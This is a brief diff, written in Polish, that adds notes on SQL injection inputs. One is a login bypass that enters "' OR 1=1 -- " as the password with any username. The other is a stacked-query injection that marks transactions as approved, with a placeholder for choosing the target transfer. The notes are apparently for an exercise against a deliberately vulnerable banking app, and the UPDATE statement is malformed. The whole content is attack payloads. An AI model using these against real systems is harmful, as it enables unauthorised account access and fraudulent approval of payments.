@@ -1,0 +1,8 @@
+Zapytanie SQL służące do zalogowania się bez znajomości hasla i loginu
+Login:
+cokolwiek
+Haslo:
+"' OR 1=1 -- "
+
+Zapytanie SQL służące do zatwierdzenia przelewu
+"' ; UPDATE transactions SET 'approved' WHERE <tutaj podac warunek, np id przelewu ktory chcemy zatwierdzic> -- "
